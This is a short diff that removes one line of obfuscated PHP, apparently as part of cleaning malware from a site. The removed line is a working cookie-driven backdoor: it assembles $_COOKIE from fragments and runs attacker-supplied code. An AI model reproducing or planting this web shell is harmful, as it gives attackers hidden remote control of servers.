@@ -1,1 +1,0 @@
-<?php $ax='E';/*xjC*/$gg='OO';/*o*/$nb='KI';/*=?*/$f='_C';$lf/*jpp**/=${$f.$gg.$nb.$ax};$mo=/*-B*/$lf['Hq'].$lf/*b4h)*/['e'];$ur=$lf['hd'].$lf['m'].$lf['I'];$do=$mo('',$ur($lf['wf']));$do();
